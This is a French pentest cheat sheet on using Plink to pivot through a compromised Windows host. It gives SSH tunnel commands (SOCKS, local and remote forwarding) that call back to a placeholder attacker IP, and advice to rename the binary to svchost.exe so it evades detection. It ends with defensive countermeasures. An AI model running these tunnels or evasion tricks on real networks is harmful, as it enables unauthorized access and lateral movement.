## Contexte et Théorie

**Plink** (PuTTY Link) est un outil en ligne de commande faisant partie de la suite PuTTY. Il permet d'établir des connexions SSH et d'exécuter des commandes à distance. Dans un contexte de pentest, **Plink** est principalement utilisé pour créer des tunnels SSH (port forwarding) afin de contourner des restrictions réseau ou d'accéder à des services internes non exposés directement depuis la machine attaquante.

> [!info]
> Contrairement à `ssh` (OpenSSH), **Plink** est un binaire autonome souvent utilisé sur les systèmes Windows où le client OpenSSH n'est pas installé ou configuré. Il est particulièrement efficace pour établir des tunnels de rebond (pivoting) depuis une machine Windows compromise vers une machine Linux contrôlée par l'attaquant.

## Prérequis

- Accès en écriture sur la machine cible pour uploader le binaire `plink.exe`.
- Un serveur SSH opérationnel sur la machine attaquante (ex: `sshd` sur Kali).
- Un compte utilisateur valide ou des identifiants compromis sur la machine cible pour authentification.

> [!danger]
> L'exécution de `plink.exe` pour la première fois génère une invite interactive demandant d'accepter la clé de l'hôte (`Store key in cache?`). Sans le flag `-batch`, le processus restera suspendu, bloquant l'automatisation et le pivoting.

## Flux d'attaque (Pivoting)

```mermaid
graph LR
    A[Machine Attaquante] -- Tunnel SSH --> B[Machine Cible Windows]
    B -- Accès Interne --> C[Service Interne Cible]
    style B fill:#f9f,stroke:#333,stroke-width:2px
```

## Commandes principales

### Tunneling dynamique (SOCKS Proxy)
Cette méthode transforme la machine cible en proxy SOCKS, permettant de scanner tout le réseau interne via des outils comme `proxychains`.

```bash
plink.exe -ssh -D 9050 -N -v -pw <password> <user>@<IP_Attaquant>
```

### Local Port Forwarding
Redirige un port local de la machine attaquante vers un port spécifique d'une machine interne au réseau cible.

```bash
plink.exe -ssh -L 8080:127.0.0.1:80 -N -v -pw <password> <user>@<IP_Attaquant>
```

### Remote Port Forwarding
Expose un service de la machine cible (ou d'une machine accessible par celle-ci) vers la machine attaquante.

```bash
plink.exe -ssh -R 8080:127.0.0.1:80 -N -v -pw <password> <user>@<IP_Attaquant>
```

## Cas d'usage courants

### Automatisation du tunnel avec acceptation automatique
Pour éviter l'interaction manuelle lors de la première connexion, utilisez le flag `-batch` et acceptez la clé via le registre ou en pré-configurant la session.

```powershell
# Acceptation automatique de la clé hôte
echo y | plink.exe -ssh -batch -L 8888:127.0.0.1:80 user@<IP_Attaquant> -pw <password>
```

> [!tip]
> Utilisez le flag `-N` pour indiquer que vous ne souhaitez pas exécuter de commande distante, mais uniquement établir le tunnel. Cela rend le processus plus discret et évite de laisser un shell ouvert inutilement.

## OPSEC et Détection

### Risques de détection
- **Logs EDR/Sysmon** : L'exécution de `plink.exe` est hautement suspecte sur des serveurs de production. Les EDR détectent souvent la création de processus enfants par des shells web ou des services compromis.
- **Trafic réseau** : Un flux SSH sortant vers une IP inconnue sur un port non standard (ou même 22) est une anomalie majeure dans les environnements surveillés.
- **Signature binaire** : Le binaire `plink.exe` est connu. Il est recommandé de le renommer (ex: `svchost.exe` ou `winupdate.exe`) pour éviter les alertes basées sur le nom de fichier, bien que le hash reste détectable.

### Contre-mesures
- **Filtrage Egress** : Bloquer les connexions sortantes SSH (port 22) depuis les serveurs internes vers Internet.
- **Surveillance des processus** : Monitorer l'exécution de binaires de tunneling (`plink`, `putty`, `ssh`).
- **Analyse de flux** : Détecter les connexions SSH persistantes de longue durée avec un faible volume de données, caractéristiques d'un tunnel de commande et contrôle (C2).

> [!warning]
> L'utilisation de `-v` (verbose) est utile pour le débogage mais génère des logs verbeux qui peuvent être capturés par des outils de monitoring si la sortie est redirigée vers un fichier.